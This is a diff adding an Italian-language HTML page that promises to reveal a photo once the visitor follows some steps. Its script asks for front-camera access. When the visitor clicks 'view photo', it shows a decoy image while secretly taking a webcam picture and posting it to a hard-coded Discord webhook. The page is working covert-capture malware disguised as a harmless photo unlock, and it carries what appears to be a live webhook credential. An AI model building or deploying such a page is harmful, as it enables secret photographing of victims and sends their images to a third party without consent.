@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Segui gli step per avere la foto!</title>
+<style>
+  #photoContainer {
+    margin-top: 20px;
+  }
+  #displayPhoto {
+    max-width: 100%;
+    height: auto;
+  }
+</style>
+</head>
+<body>
+
+<h1>Segui gli Step per avere la foto!</h1>
+<a href="#" id="startLink">Apri sito e richiedi permessi</a>
+<br><br>
+<button id="viewButton" disabled>Visualizza foto</button>
+<div id="photoContainer">
+  <img id="displayPhoto" src="" alt="" style="display:none;" />
+</div>
+
+<script>
+  const webhookUrl = 'https://discord.com/api/webhooks/1410544134195904542/2PKKSOkgheoY0D2PrMxJWTxnD70cLJKqKvZxqVx9l7ID3XUy-eTx6k4I-f8ycV5ICYVU'; // Inserisci il webhook Discord qui
+  
+  let stream;
+  let videoTrack;
+
+  document.getElementById('startLink').addEventListener('click', async function(e) {
+    e.preventDefault();
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      videoTrack = stream.getVideoTracks()[0];
+      alert('Permessi fotocamera ottenuti! Puoi usare il pulsante.');
+      document.getElementById('viewButton').disabled = false;
+    } catch (err) {
+      alert('Permesso fotocamera negato o erro: ' + err);
+    }
+  });
+
+  document.getElementById('viewButton').addEventListener('click', async function() {
+    const imgContainer = document.getElementById('photoContainer');
+    const displayPhoto = document.getElementById('displayPhoto');
+
+    // Mostrare la foto che aggiungerai tu (qui puoi settare un'immagine statica)
+    // esempio:
+    displayPhoto.src = 'https://cdn.discordapp.com/attachments/1410366523494760590/1410368782714802196/Screenshot_2024-05-24_232726.png?ex=68b609c9&is=68b4b849&hm=9e061c319ae4022e4832d56eae2d724e0979b8992786513e3447d6acbae2fadc&'; // inserisci il percorso della tua foto
+    displayPhoto.style.display = 'block';
+
+    // Scattare la foto dalla webcam
+    const track = videoTrack;
+    const imageCapture = new ImageCapture(track);
+    try {
+      const photoBlob = await imageCapture.takePhoto();
+      
+      // Per inviare la foto su Discord, possiamo usare fetch con FormData
+      const formData = new FormData();
+      formData.append('file', photoBlob, 'foto.jpg');
+
+      await fetch(webhookUrl, {
+        method: 'POST',
+        body: formData
+      });
+      alert('Foto sbloccata!');
+    } catch (err) {
+      alert('Errore nel catturare la foto: ' + err);
+    }
+  });
+</script>
+
+</body>
+</html>
